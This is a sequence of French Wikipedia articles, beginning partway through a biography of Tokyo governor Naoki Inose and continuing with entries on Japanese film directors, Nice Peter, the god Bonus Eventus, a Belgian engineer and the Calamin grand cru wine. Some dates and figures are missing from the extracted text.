et .
Après sa sortie de l'université Shinshū, il travaille pour une maison d'édition et est diplômé en 1972 d'un master de l'école doctorale en sciences politiques et économie politique de l'université Meiji, située dans l'arrondissement de Chiyoda à Tokyo, sous la direction du politologue et historien Bunzō Hashikawa, spécialiste de l'histoire de la pensée politique au Japon, auprès duquel il recherche surtout des enseignements sur ses études des nationalismes.
Un écrivain engagé.
Naoki Inose devient, dans les années 1980 et 1990, un essayiste connu au Japon pour ses travaux documentaires et ses analyses des sociétés japonaises modernes, dont il critique les classes dirigeantes qu'il estime hostile à toute réforme.
En 1983, il fait ses débuts littéraires avec son , littéralement « Défait dans la guerre dès l'été 1941 : prévision d'une défaite certaine dans la guerre nippo-américaine par le "Cabinet simulé" de l'Institut de recherche sur la guerre totale », publié aux éditions "Sekai Bunka" (réédité ensuite par "Bunshun Bunko" en 1986 puis "Chōkō Bunko" en 2010). Il y étudie l'« Institut de recherche sur la guerre totale » (), suspecté par le Tribunal militaire international pour l'Extrême-Orient de 1946 d'être un groupe de pression nationaliste en faveur du conquête du monde par le Japon mais dont le rôle était celui d'un cercle de réflexion constitué par le gouvernement japonais en 1941 pour étudier les conséquences d'une entrée en guerre contre les États-Unis. Organisé comme un véritable « cabinet » (chacun de ses membres recevant un « ministère » sous le point-de-vue duquel il doit analyser les effets d'un conflit), la neutralité politique est alors recommandée pour arriver à une conclusion objective. Inose fait alors valoir que celle-ci prévoit d'ores et déjà les éléments de la défaite future : « Supposez que des attaques sont menées à la mi-décembre [1941], et supposée qu'elles sont couronnées de succès. Parmi les évènements, des victoires dans les batailles initiales peuvent être espérées. Mais il n'y aura aucun moyen pour le Japon de gagner la guerre en raison de sa nette infériorité matérielle. La guerre se prolongera. L'Union soviétique s'immiscera, et le Japon sera défait. Donc, la marche vers la guerre avec les États-Unis doit absolument être évitée ». Inose attribue donc la défaite finale au gouvernement militaire qui n'a pas pris en compte ces informations. Il compare plus tard cet aveuglement à la « bureaucratie » d'État, qui serait réfractaire aux réformes en masquant ou mettant de côtés certaines données, et déclare : « Toute réforme peut être menée si la population partage des données plus précises et objectives que celles transmises par les autorités ». La même année, il avait aussi publié , littéralement : « La silhouette de l'empereur », édité par l’"Asahi Shimbun".
Un autre ouvrage sur l'empereur, , littéralement : « Le portrait du Mikado » ou « Mikado : Un portrait », publié en 1986 aux éditions "Shōgakukan" et dans lequel il étudie l'évolution de l'image et de la conceptualisation à travers l'histoire mondiale du système impérial moderne (notamment comment il a été défini, maintenu, approprié et représenté au Japon comme en Occident), reçoit l'année suivante le prix du livre documentaire Sōichi Ōya ainsi que le prix de la Société pour l'étude du japonisme. Il y développe trois thèmes tout particulièrement : d'abord comment, après la Seconde Guerre mondiale, le groupe Seibu a pu s'approprier des terres impériales pour y développer les activités de sa chaîne des Prince Hôtels ; puis il étudie la perception du système impérial dans le monde à travers l'opérette anglaise "The Mikado" ; et enfin il souhaite comprendre pourquoi le portrait impérial de Meiji Tennō à les attributs d'un Occidental. Il se fait également connaître pour ses biographies de plusieurs écrivains représentatifs de la littérature japonaise du : aux éditions "Bungei Shunjū" en 1995 (littéralement « "Persona" : Biographie de Yukio Mishima », traduit en anglais en 2012 par Hiroaki Satō) ; aux éditions "Shōgakukan" en 2000 (littéralement « Picaresque - biographie d'Osamu Dazai ») ; aux éditions "Bungei Shunjū" en 2004 (littéralement « Le royaume du cœur. Kan Kikuchi et la naissance de "Bungei Shunjū" »). À travers ces personnages, il étudie tout particulièrement leur rôle social ainsi que la modernité japonaise dans son ensemble. Son , publié par "Shōgakukan" en 1993 (littéralement « Le siècle des navires noirs. Histoire militaire future du pays du Mikado ») et publié en anglais en 2009 sous le titre "The Century of Black Ships: Chronicles of War between Japan and America", fait ressortir de la littérature japonaise du et du début du l'anxiété d'un conflit avec les États-Unis.
Mais son engagement politique ressort surtout dans , soit littéralement « Une étude du Japon », aux éditions "Bungei Shunjū" et qui lui vaut le prix des lecteurs du magazine "Bungei Shunjū" en 1996. Il y décrit et critique les Corporations publiques japonaises et leur influence, parlant d'un triangle de pouvoir unissant « Toranomon » (quartier de Tokyo où se trouvent de nombreux sièges de ces corporations), « Kasumigaseki » (quartier des ministères et nom donné à la haute-administration d'État) et Nagatachō (district où se trouvent la Diète du Japon et la résidence du Premier ministre et nom désignant la classe politique) et appelant à des réformes structurelles.
Conseiller de Koizumi.
Naoki Tanose devient l'un des experts ou représentants de la société civile dont Jun'ichirō Koizumi, Premier ministre de 2001 à 2006 élu sur un programme visant à de profondes transformations des manières de faire de la politique et de l'organisation de l'État, s'entoure pour théoriser, planifier et organiser ses réformes structurelles visant à réduire le poids de l'administration centrale par la décentralisation, la déconcentration, la dérégulation et la privatisation. Il est ainsi nommé en 2001 au nouvellement créé Conseil de mise en place des réformes administratives (unité consultative placée auprès du ministre d'État chargé des Réformes administratives, Nobuteru Ishihara) et de la commission des Taxes. Il est également membre du Centre de recherche international pour les études japonaises de 2001 à 2003. En 2006 il devient aussi professeur auprès du Centre pour la civilisation mondiale de l'Université de Technologie de Tokyo.
Mais surtout, défenseur ardu d'une privatisation des corporations routières (jugées comme un des emblèmes de l'ancien « triangle de fer », au cœur du système de l'« État construction », modèle japonais de l'État providence développé depuis 1945 basé sur la construction de grandes infrastructures et critiqué par ses opposants comme source de gaspillage, de corruption et de clientélisme), il est nommé l'année suivante au sein de la commission pour la privatisation des quatre corporations publiques routières (à savoir celle des autoroutes du Japon dite "Nihon Dōro Kōdan" ou JH, celle des autoroutes de la capitale, celle des autoroutes du Hanshin et celle des ponts de Shikoku-Kyūshū). Son positionnement concernant une baisse des dépenses de fonctionnement était si fort que plusieurs cadres issues de ces entreprises ont refusé de siéger à ses côtés dans la commission. Il joue ainsi un rôle de premier plan dans ce processus de privatisation, qui est finalisé le . Puis, la décentralisation étant un autre de ses chevaux de bataille, il est nommé à sa création en au sein de la commission pour une « vision du » de la décentralisation présidée par Heizō Takenaka (alors ministre des Affaires intérieures et autre « expert » réformateur libéral entourant depuis 2001 Jun'ichirō Koizumi) puis dans celle, le , de promotion de la réforme de la décentralisation auprès du Bureau du Cabinet (dirigée pour sa part par le dirigeant de la compagnie Itōchu Uichirō Niwa). Mais il devient surtout la même année vice-gouverneur de Tokyo.
Au gouvernement métropolitain de Tokyo.
Vice-gouverneur.
Le , le gouverneur de Tokyo Shintarō Ishihara, réélu deux mois auparavant pour un troisième mandat, annonce la nomination de Naoki Inose à l'un des quatre postes de vice-gouverneur. Il est la première personnalité issue du privée (ni fonctionnaire, ni homme politique) à être nommé à une telle fonction, et le seul des quatre à voir mentionnée comme attribution celle d'« assister aux affaires spéciales ordonnées par le gouverneur ». Ishihara, qui comme lui est un ancien écrivain et un partisan de profondes réformes structurelles, justifie son choix en mettant en avant autant les positions politiques d'Inose que ses liens tissés depuis 2001 avec la classe politique nationale, déclarant : « M. Inose est une voix influente contre le gouvernement central ainsi que pour une compréhension des dossiers entre le gouvernement métropolitain et l'État ». Naoki Inose déclare vouloir « changer le gouvernement central en commençant par Tokyo » (reprenant l'un des slogans du gouverneur), décrivant l'administration métropolitaine « plus flexible », et donc plus facile à réformer, que l'État. Il est confirmé à ce poste après la réélection pour un quatrième mandat de Shintarō Ishihara le .
L'une de ses premières réalisations en tant que vice-gouverneur est de réussir à convaincre en Shintarō Ishihara de ne pas donner son autorisation à la construction (dont le coût est estimé à 3,8 milliards de yens) d'un nouveau complexe de logements pour les membres de la Chambre des conseillers. Les médias, comme le "Japan Times", notent toutefois les différences de point de vue entre les deux hommes sur un certain nombre de sujets, tels que la délocalisation de la capitale (défendue par Inose mais vivement combattue de longue date par Shintarō Ishihara) et sur certaines propositions de taxe (en tant que membre de la commission nationale sur la décentralisation, Inose a fait des propositions qui auraient pour effet de détourner une partie des revenus de l'impôt sur les sociétés perçus par Tokyo pour les rediriger vers des préfectures rurales afin de réduire les inégalités territoriales, ou a soutenu le plan dit du "furusato nozei" qui viserait à permettre aux citoyens de verser une partie de leur taxe immobilière à leurs municipalités d'origine, deux projets eux aussi combattus par Shintarō Ishihara). À ce sujet, Shintarō Ishihara déclare : « Nos opinions peuvent différer mais je crois qu'il est sain pour nous de débattre et de discuter beaucoup de nos différences ».
Il milite tout particulièrement à partir de 2010 pour la fusion des deux réseaux de métro (Tokyo Métro, société détenue majoritairement par le gouvernement central, et celui du Tōei, compagnie gérée par la métropole).
Chargé également des questions de l'énergie, il entame après l'accident nucléaire de Fukushima un bras de fer avec la "Tokyo Electric Power Company" (TEPCO), qui gère la centrale de Fukushima et fournit en électricité Tokyo, afin de réformer le secteur et faire cesser les coupures de courant devenues fréquentes depuis la catastrophe. En , il annonce que le gouvernement métropolitain a l'intention de faire construire une centrale thermique au gaz ayant la capacité de production d'une centrale nucléaire indépendante de TEPCO. Le mois suivant, il présente le plan de construction de cette infrastructure associé à une libéralisation de l'accès au réseau électrique de TEPCO (détenteur d'un monopole en la matière) pour des producteurs indépendants et au lancement d'une réhabilitation dans la décennie les stations thermiques les plus âgées de la baie de Tokyo en appelant huit autres gouvernements locaux voisins à mettre en commun des fonds pour la financer. Il mène également des discussions avec la "Chubu Electric Power" pour approvisionner la capitale. Puis, le , le gouvernement métropolitain annonce qu'il est devenu le principal actionnaire de TEPCO, alors qu'il détenait jusqu'alors seulement 2,66 % du capital de la société (faisant lui le troisième actionnaire jusqu'en ). Il entend utiliser cette nouvelle position pour empêcher la hausse des factures d'électricité prévue par l'entreprise pour contrer les coûts de la gestion de Fukushima et les dommages versés pour la catastrophe. Le 27 juin suivant, lors d'une assemblée générale, Tokyo dépose des propositions d'actionnaire demandant une plus grande transparence et diffusion des informations concernant la manière dont sont calculés les tarifs de vente de l'électricité sont calculés afin que des tiers-parties puissent vérifier les factures. Il a alors contracté une stratégie commune de celle du maire d'Osaka, Tōru Hashimoto, visant à mener des actions concertées dans les sociétés électriques dont ils sont actionnaires (la "Kansai Electric Power Company", ou KEPCO, pour Osaka), et cela même si Inose adopte une attitude plus réaliste et n'embrasse pas le discours anti-nucléaire alors développé par Hashimoto.
Il exprime ses opinions concernant la gestion de la métropole à travers cinq livres publiés durant ses années en tant que vice-gouverneur : , littéralement « J'essaye de devenir vice-gouverneur de Tokyo », "Shōgakukan 101 Shinsho" en 2010 ; , ou « Qui contrôle les métros ? », chez "Chūkō Shinsho" en 2011 ; , soit « Le pouvoir des mots : faire un pays selon le "point de vue d'un écrivain" », édité par "Chūkō Shinsho Rakure" la même année ; , littéralement « Le pouvoir de prendre des décisions », puis , ou « Le pouvoir de régler les problèmes », publiés en 2012 (le , en pleine campagne pour l'élection du gouverneur, pour le deuxième) par le "PHP Institute".
Gouverneur.
Le , Shintarō Ishihara annonce sa démission du poste de gouverneur pour former son propre parti et se présenter aux élections nationales. Cette démission est effective le suivant, et le lendemain Naoki Inose devient gouverneur par intérim, en fonction jusqu'à l'élection anticipée prévue le suivant. Le , il annonce être lui-même candidat à ce scrutin. Restant sans étiquette, il obtient toutefois le soutien de plusieurs formations plutôt situées à la droite de l'échiquier politique japonais. Ainsi est-il investi par Ishihara et le parti dont il vient de prendre la présidence, l'Association pour la restauration du Japon (ARJ) également animée par Tōru Hashimoto, mais aussi par le Nouveau "Kōmeitō", un parti qui a une bonne implantation à Tokyo, tout en ayant le soutien du Parti libéral-démocrate et de Votre Parti.
Il fait campagne en mettant en avant la continuité avec les années Ishihara et les projets phares de ce dernier (tel que celui de faire de l'aéroport de Haneda un "hub" d'importance mondiale, ou encore la candidature de Tokyo aux Jeux olympiques d'été de 2020). À côté de cela, l'essentiel des axes principaux qu'il développe reprennent ses propres chevaux de bataille : la réforme du secteur de l'électricité « afin de fournir une énergie abordable, sûre et propre » passant par la construction de la centrale à gaz, tout en indiquant qu'« une utilisation des énergies géothermiques, solaires et éoliennes dans les îles de Tokyo est examinée ». Il met en avant aussi des projets sociaux, un domaine considéré par les observateurs politiques comme l'un des principaux points faibles du bilan de Ishihara. Il propose ainsi d'accentuer une des idées proposées alors qu'il était vice-gouverneur, celui du « logement de soin » qui vise à construire des habitations équipées pour les personnes âgées (avec la promesse d'atteindre les maisons de soins en 2013, contre déjà, selon lui, livrées en 2012). Il promet également une augmentation des fonds pour financer les centres certifiés de garde d'enfants pour aider les femmes travaillant.
Le , il est nettement élu, avec voix soit 65,27 % des suffrages exprimés, pour un taux de participation de 62,6 % (4,8 points de plus qu'en 2011), face à huit autres candidats. Son candidat direct, Kenji Utsunomiya, avocat et ancien président de la Fédération des barreaux du Japon soutenu par de nombreux partis de gauche ou d'opposition locale à Ishihara (le nouveau mouvement anti-nucléaire Parti du futur du Japon, largement constitué de dissidents récents du Parti démocrate du Japon au pouvoir alors depuis 2009, le Parti communiste japonais, le Parti social-démocrate, Les Verts, le Nouveau parti socialiste, le réseau du Seikatsu Club ainsi que les principaux syndicats), obtient moins du cinquième de son score (14,58 %). Il s'agit du plus important score jamais obtenu par un candidat individuel de l'histoire de cette élection.
En , Inose, embourbé dans un scandale lié au financement de sa campagne électorale, annonce sa démission. Sa démission est acceptée par l'Assemblée de la métropole le et il est remplacé à titre intérimaire par le vice-gouverneur Tatsumi Ando.

</doc>
<doc id="6805063" url="https://fr.wikipedia.org/wiki?curid=6805063" title="L'Écume des jours (film, 1968)">
L'Écume des jours (film, 1968)

L'Écume des jours est un film français de Charles Belmont, adapté du roman homonyme de Boris Vian et sorti en 1968.
Synopsis.
Chick se prend d'amour pour Alise à cause d'une passion commune qui dévorera peu à peu leur couple. Colin tombe aussi amoureux d'une femme, Chloé, qui lui rappelle un morceau de jazz de Duke Ellington du même nom. Mais la maladie, et le manque d'argent vont venir bouleverser leur destin.
Musique.
La musique du film est d'André Hodeir avec quelques effets électroniques de Pierre Henry.

</doc>
<doc id="6805066" url="https://fr.wikipedia.org/wiki?curid=6805066" title="Nozomu Kasagi">
Nozomu Kasagi

 est un réalisateur japonais.

</doc>
<doc id="6805071" url="https://fr.wikipedia.org/wiki?curid=6805071" title="Mitsuhiro Mihara">
Mitsuhiro Mihara

, né en 1964 à Kyoto, est un réalisateur japonais.
Biographie.
Mihara Mitsuhiro fait ses études à l'université des arts d'Osaka.

</doc>
<doc id="6805073" url="https://fr.wikipedia.org/wiki?curid=6805073" title="Peter Shukoff">
Peter Shukoff

Peter Alexis Shukoff (né le , à Rochester, New York, aux États-Unis), connu sous le nom de scène Nice Peter, est un acteur américain, musicien, chanteur et personnalité sur l'internet. Il se décrit lui-même comme un comédien, « virtuose de la guitare » (guitar hero). Peter, en effet, compose, joue de la guitare et chante des chansons souvent satiriques, et participe à des concerts. Mais il est plus particulièrement renommé pour ses vidéos musicales et comiques sur sa chaîne dédiée de YouTube (« Nicepeter ») et surtout "Epic Rap Battles of History", la web-série cofondée avec Lloyd Ahlquist.
En , il est sur YouTube la la plus suivie de tous les temps et le musicien le plus suivi avec ses 1,9 million d'internautes abonnés. Ses trois chaînes YouTube, « Nicepeter », « ERB » ("Epic Rap Battles") et « ERB 2 », totalisent plus de 18,7 millions d'abonnés et 5,34 milliards de visionnages de vidéos (au mois de ). Ils ont été présentés sur le webjournal américain d'information The Huffington Post, le Billboard.com, et le magazine Wired (). Interrogé sur le site de Forbes, Peter expose l'histoire et les raisons de son succès et de celui de son partenaire Lloyd Ahlquist.
Carrière de musicien et d'acteur.
Peter Shukoff apprend à jouer de la guitare avant la fin de ses études. Il suit aussi en parallèle une carrière dans la comédie. À Chicago où il s'est provisoirement installé, il joue ses chansons ironiques en direct dans plusieurs bars de la ville, puis dans le centre-ouest des États-Unis, et enfin en Grande-Bretagne. Il émigre en Californie. Peter fait partie de groupes en tournée, aussi bien en Amérique qu'en Angleterre, où il chante et reproduit en direct les vidéos des battles d"Epic Rap Battles of History", avec des invités et parfois quelques spectateurs. 
En 2014, de fin mai à fin juillet, il entame avec Dante Cimadamore une tournée de chants « live » à travers tous les États-Unis (vingt dates), puis l'Europe (quinze dates).
Nice Peter a créé la bande son de la « rap battle » entre Bubbles et les mouettes, dans le film "". Nice Peter y incarne brièvement un surfeur (avec Lloyd Ahlquist).
L'année suivante, en 2015, Peter Shukoff et son compagnon de scène Lloyd Ahlquist jouent dans une nouvelle tournée intitulée "Epic Rap Battles of History Live World Tour 2015", en Amérique (vingt-sept dates) et en Europe (vingt-quatre dates, dont deux concerts en France : à Marseille et à Paris).
Discographie.
Albums (hors ERBoH) :

</doc>
<doc id="6805074" url="https://fr.wikipedia.org/wiki?curid=6805074" title="Shun'ichi Nagasaki">
Shun'ichi Nagasaki

, né le , est un réalisateur et scénariste japonais.

</doc>
<doc id="6805078" url="https://fr.wikipedia.org/wiki?curid=6805078" title="Masahiko Nagasawa">
Masahiko Nagasawa

, né le à Ōdate (préfecture d'Akita) est un réalisateur japonais.
Biographie.
Masahiko Nagasawa reçoit le prix du meilleur nouveau réalisateur pour son film "Koko ni irukoto" lors de l'édition 2002 du festival du film de Yokohama.

</doc>
<doc id="6805082" url="https://fr.wikipedia.org/wiki?curid=6805082" title="Hiroyuki Nakano">
Hiroyuki Nakano

, né le à Fukuyama dans la préfecture de Hiroshima, est un réalisateur japonais.
Biographie.
Hiroyuki Nakano fait ses études l'université Waseda.

</doc>
<doc id="6805084" url="https://fr.wikipedia.org/wiki?curid=6805084" title="Championnat de France de basket-ball 1946-1947">
Championnat de France de basket-ball 1946-1947

La saison 1946-1947 du championnat de France de basket-ball Excellence est la du championnat de France masculin de basket-ball.
Paris UC remporte le championnat.
Présentation.
À la différence des saisons précédentes qui se déroulaient en matchs à élimination directe, la saison 1946-1947 prévoit l'organisation de poules qualificatives en deux séries dont sont issus les demi-finalistes qui s'affrontent sur un seul match éliminatoire, de même que les finalistes.
Équipes participantes.
32 équipes réparties en huit poules de quatre pour la série.
Classement de la saison régulière.
Classement au terme de la :
Titres.
3. Faucherre • 4. Gravas • 5. Frézot () • 6.A. Boutin-Desvignes • 7. Favory • 8. Guillou • 9. Posniakowsky • 10. Rival - Entraîneur : G. Boutin Desvignes 

</doc>
<doc id="6805090" url="https://fr.wikipedia.org/wiki?curid=6805090" title="Miwa Nishikawa">
Miwa Nishikawa

 est une réalisatrice et romancière japonaise.
Biographie.
Miwa Nishikawa est diplômée de littérature de l'université Waseda.
Après avoir travaillé en tant qu'assistante réalisatrice sur "Distance" de Hirokazu Koreeda, ce dernier produit son premier long métrage en 2003, pour lequel elle obtient le prix de meilleure nouvelle réalisatrice lors de l'édition 2004 du festival du film de Yokohama.
Son deuxième film, est sélectionné à la quinzaine des réalisateurs en 2006, et remporte l'année suivante les prix du meilleur réalisateur, du meilleur film et du meilleur scénario au festival du film de Yokohama.
En 2009, elle adapte son propre roman au cinéma, ce dernier est sélectionné lors de la 12ème édition du Kinotayo, où il y remporte le Soleil d'or, le premier prix, exæquo avec "Oh Lucy!" et "Close-Knit". Le film sort en France le 29 novembre 2017.

</doc>
<doc id="6805096" url="https://fr.wikipedia.org/wiki?curid=6805096" title="Bonus Eventus">
Bonus Eventus

 (Bon Succès, en français) est une personnification divine dans la religion de la Rome antique. Le savant Varron de la République romaine le qualifie d'une des douze divinités qui présidaient à l'agriculture. Associé à , déesse qui influait sur l'approvisionnement en eau, Bonus Eventus a peut-être à l'origine une fonction agricole, mais, pendant l'Empire romain, représente un concept plus général de la réussite et est l'une des nombreuses abstractions qui figurent sur des revers monétaires.
Culte et inscriptions.
Bonus Eventus avait un temple de date inconnue sur le Champ de Mars. Ce temple n'est mentionné que par Ammien Marcellin lorsque ce dernier parle d'un nouveau portique (le "Porticus Boni Eventūs") construit par le préfet de Rome Claudius en 374. Cinq chapiteaux corinthiens « d'une taille extraordinaire » découvertes au ont peut-être fait partie de ce portique, qui se trouvait dans les jardins d'Agrippa.
On trouve des inscriptions qui prouvent la croyance en ce dieu à plusieurs endroits, même dans les provinces. En Bretagne, le plancher en mosaïque d'une villa de Woodchester portait le rappel suivant : "Adorez dûment Bonus Eventus." Une consécration faite par un couple marié à Bonus Eventus et à Fortuna indique que la sphère d'influence du dieu s'étendait au-delà de l'agriculture et de l'incarnation des vertus impériales. Bonus Eventus figure régulièrement sur des gemmes gravées, et il était la figure la plus fréquente sur les 127 intailles trouvées dans la cache d'un bijoutier de Snettisham : on le trouvait sur 25 pour 100 d'entre elles. Ces usages semblent indiquer que le dieu avait un rôle protecteur ou tutélaire et qu'il y avait une communauté religieuse à laquelle le bijoutier vendait ses marchandises.
Iconographie.
Quelques monnaies représentant Bonus Eventus ont été frappées pour Galba et sous les règnes de Vespasien et Titus, d'Antonin le Pieux et de Septime Sévère. Sur ces pièces de monnaie et des gemmes, Bonus Eventus est un jeune homme nu debout, de face ou de profil, qui a d'habitude une jambe fléchie et la tête tournée vers la patère qu'il tient dans sa main tendue. Représenté de profil, il porte une chlamyde qui lui couvre le dos ou un himation qui est passé sur l'épaule et dont les extrémités encadrent son torse. Des pavots et des épis sont des attributs fréquents du dieu.
Dans son livre sur la sculpture, Pline l'Ancien décrit deux statues de Bonus Eventus qui étaient en fait des interprétations romaines de modèles grecs. L'une était un bronze d'Euphranor; et l'autre, un marbre de Praxitèle. Celle-ci se trouvait avec une statue de Fortuna dans le temple dédié à la triade capitoline ; et celle-là, entre l"'Athéna" recyclée située sous le Capitole et la Léto du temple de la Concorde. On ne sait trop, d'après la description de Pline, si les deux statues grecques représentaient à l'origine le même dieu grec. L'historien de l'art Adolf Furtwängler a conjecturé que Praxitèle avait représenté Agathodémon, puisque ce dernier était accompagné de Fortuna, peut-être une traduction de la Tyché grecque. Le bronze d'Euphranor passe parfois pour avoir inspiré l'iconographie des pièces de monnaie et des gemmes, car il tenait des coquelicots et des céréales. Ces attributs portent à croire à une divinité liée aux Mystères d'Éleusis, et alors que l'original grec passe très souvent pour être Triptolème, aucune représentation disponible de celui-ci ne montre la combinaison de coquelicots et de céréales, qui est associée à Déméter (la Cérès romaine).

</doc>
<doc id="6805101" url="https://fr.wikipedia.org/wiki?curid=6805101" title="Keisuke Yoshida (réalisateur)">
Keisuke Yoshida (réalisateur)

, né le , est un réalisateur et scénariste japonais.
Biographie.
Keisuke Yoshida est diplômé de l'École des Arts visuels de Tokyo. Il travaille en tant qu'assistant, puis chef éclairagiste de Shin'ya Tsukamoto sur plusieurs tournages avant de réaliser un premier long métrage en 2005, avec lequel il remporte le grand prix du Fantastic Off-Theatre Competition lors de l'édition 2006 du Festival international du film fantastique de Yubari.
En 2008, il publie un roman , qu'il adapte la même année pour le cinéma. En 2010 "Sankaku", prix du meilleur film au Tama Cinema Forum, révèle au public son sens de l’humour et du portrait.
Keisuke Yoshida réalise deux films tirés d'un manga, "Silver Spoon" en 2014 puis "Hime-anole" en 2016, adapté de l’œuvre de Minoru Furuya.

</doc>
<doc id="6805103" url="https://fr.wikipedia.org/wiki?curid=6805103" title="Revue souffles">
Revue souffles



</doc>
<doc id="6805106" url="https://fr.wikipedia.org/wiki?curid=6805106" title="Lafayette Fying Corps">
Lafayette Fying Corps



</doc>
<doc id="6805107" url="https://fr.wikipedia.org/wiki?curid=6805107" title="Gustave Royers">
Gustave Royers

Gustave "(Gust, Gustaaf)" Andreas Royers ou Roÿers, né le à Renaix et décédé le d'une maladie du cœur à Anvers est homme politique libéral belge flamand.
Biographie.
Gustave Royers fit des études d'ingénieur de ponts et chaussées (1870-RUG). Ensuite, il travailla à l'administration des Ponts et Chaussées au service spécial de la Côte (1870-1875). En 1875, le conseil communal d'Anvers le nomma ingénieur en chef de la Ville, responsable et il devint enseignant à l"'Académie Royale des Beaux-Arts". Royers fut impliqué dans la construction de nouvelles voies, travaux d'assainissement, égouttage, quais de l'Escaut et l'expansion du port avec l'agrandissement des docks existants ou la création de nouveaux. Une écluse de mer reçut son nom. Le port pétrolier déménagea. Il construisit des écoles, le "Zeemanshuis", le stand de tir au "Kiel", la piscine et sauvegarda le "Steen".
Royers fut actif dans la vie sociale: membre des éclaireurs à cheval de la Garde Civile, de la commission de gestion de l'école industrielle, du comité provincial de santé publique, des "Elèves de Thémis" dans l' "Association Libérale".
Il siégea au conseil provincial (1889-1892 ; 1894-1904), fut élu député (1910-1921), conseiller communal (1912-1921), ensuite sénateur (1921-1923).
Royers s'intéressa surtout aux dossiers de Travaux Publics. Il s'opposa ensemble avec le bourgmestre libéral Jan Van Rijswijck aux plans du gouvernement de creuser un nouveau tronçon d'Escaut. L'alternative de Royers sera finalement accepté par le ministre Joris Helleputte.

</doc>
<doc id="6805108" url="https://fr.wikipedia.org/wiki?curid=6805108" title="France aux championnats d'Europe d'athlétisme">
France aux championnats d'Europe d'athlétisme

La France participe aux championnats d'Europe d'athlétisme depuis la première édition, en 1934 à Turin. Après les championnats d'Europe 2024, son bilan est de 219 médailles, dont 73 en or.
Médaillés.
Ce tableau liste tous les médaillés français des Championnats d'Europe d’athlétisme depuis 1934.
Participants par édition.
Berlin 2018.
La Fédération française d'athlétisme communique sa sélection définitive le 25 juillet 2018 :
Munich 2022.
La liste des 101 athlètes français est publiée le 4 août 2022 :
Rome 2024.
La liste est publiée par la Fédération française d'athlétisme le . En raison d’une erreur administrative de la part de la FFA, Azeddine Habz () et Simon Bédard () n'ont pas été inscrits et ne peuvent participer à ces championnats d'Europe. L'Association européenne d'athlétisme, qui refusait dans un premier temps de réintégrer ces deux athlètes dans ses listes d'engagés, revient sur sa décision le et les autorisent à participer à ces championnats.

</doc>
<doc id="6805109" url="https://fr.wikipedia.org/wiki?curid=6805109" title="Kazuhiko Yamaguchi">
Kazuhiko Yamaguchi

, né le , est un réalisateur et scénariste japonais.
Biographie.
Originaire de la préfecture de Nagano, Kazuhiko Yamaguchi est diplômé de l'université Waseda et commence à travailler aux studios Toei à Kyoto. Il a dirigé plusieurs séries de films d'action dans les années 1970 ainsi que de nombreux téléfilms.

</doc>
<doc id="6805113" url="https://fr.wikipedia.org/wiki?curid=6805113" title="Calamin grand cru">
Calamin grand cru

Le Calamin est un vin blanc de Lavaux, région viticole du canton de Vaud en Suisse. Il est protégé par une appellation d'origine contrôlée grand cru.
Histoire.
Ce site, dominant le lac Léman, a été traversé par une voie romaine. Couvert de vignes au Moyen Âge, Épesses dépendait du prieuré bénédictin de Lutry. 
Au cours de l'époque bernoise, le village, rattaché au bailliage de Lausanne, formait l'un des "quarts" de la commune de Villette, il y comptait pour deux tiers, Crêt pour l'autre tiers. La commune fut créée en 1824 se substituant à la confrérie médiévale. 
Traversé par deux lignes de chemins de fer, par une route à grand trafic et une autoroute, Epesses est un village-rue au milieu du vignoble s'étageant des bords du Léman (Calamin grand cru) à environ .
Calamin et Dézaley sont les premiers sites viticoles en Suisse à s'être vus attribuer, en 2009, la mention AOC Grand Cru.
Étymologie.
Calamin tirerait son origine soit du patronyme "Calame" (du latin "calamus" = scribe), soit d'un anthroponyme germanique ("Galaman" = chanter et manna = homme).
Situation géographique.
Orographie.
Ce vignoble de Lavaux fait partie avec le Dézaley des deux appellations les plus prestigieuses du canton. Il est accroché sur des terrasses à pente abrupte, façonnées par l'homme, qui descendent jusqu'au lac Léman. Les vignes y reçoivent trois soleils : . Les raisins qui y mûrissent sont plus structurés et plus riches en sucre.
Géologie.
Ce terroir viticole a été modelé lors de la glaciation du Würm par le glacier du Rhône et le dépôt de ses moraines, 62 % des vignes sont implantées sur celles-ci. Dans le secteur d'Épesses, la langue glaciaire a érodé à Dézelay un substrat marno-gréseux qu'elle a recouvert de moraines, et dégagé les molasses argileuses sur les pentes de Calamin.
Climat.
Le maximum des températures est atteint au cours des mois de juin, juillet et août, les minima en décembre, janvier et février.
Vignoble.
Présentation.
Le terroir viticole cet AOC couvre et se trouve sur la commune de Bourg-en-Lavaux.
Encépagement.
Le principal cépage vinifié est le chasselas.
Méthodes culturales et réglementaires.
L'obtention de la mention "grand cru" est liée au terroir ou à la commune dont est issue la vendange. Ce nom doit être mentionné sur l'étiquette. De plus, il est obligatoire que cette récolte provienne à 90 % de ce terroir ou de cette commune, seuls sont admis, dans les 10 % restants, des chasselas issus d'un autre terroir régional.
Réglementairement, la teneur naturelle en sucre doit être au minimum supérieure de 5°Oe. De plus, la mention du millésime est obligatoire sur l'étiquetage. Cultivé manuellement, ce vignoble a une densité de plantation de pieds à l'hectare, il est taillé soit en guyot soit en cordon de Royat.
Vinification et élevage.
Dans la vinification en blanc la fermentation se déroule en dehors de tout contact avec les parties solides de la vendange (pépins, peaux du raisin, rafles). Le but de cette vinification est de faire ressortir le maximum des arômes contenus d'abord dans le raisin, ensuite en cours de fermentation, enfin lors du vieillissement. 
L'extraction du jus et sa séparation des parties solides peuvent être précédés par un éraflage, un foulage et un égouttage, pour passer ensuite au pressurage. Mais ces phases sont évitées par nombre de vinificateurs pour éviter l'augmentation des bourbes. Le choix se porte sur une extraction progressive du jus puis un débourbage qui permet d'éliminer toute particule en suspension. La maîtrise des températures s'impose lors de la fermentation alcoolique. Elle se déroule entre 18 et 20° et dure entre 8 et 30 jours selon le type de vin désiré.
Terroir et vins.
L'altitude et le gradient jouent un rôle déterminant dans la qualité du vin de Calamin. Le vignoble qui affleure la surface du lac s'élève en flèche de 300 mètres avec des gradients pouvant atteindre 90 %. Ce grand cru, dont le terroir homogène est caractérisé par des sols profonds et argileux, possède des vins racés, puissants et virils aux multiples facettes aromatiques. Les notes minérales s'allient avec une chaleur en bouche où perce le caramel. À l'agitation, il tapisse le palais d'une saveur séveuse jointe à une pointe d'amertume.
Structure des exploitations.
La petitesse de ce terroir fait qu'il est partagé entre plusieurs petits producteurs dont une union vinicole et une commune.
Type de vins et gastronomie.
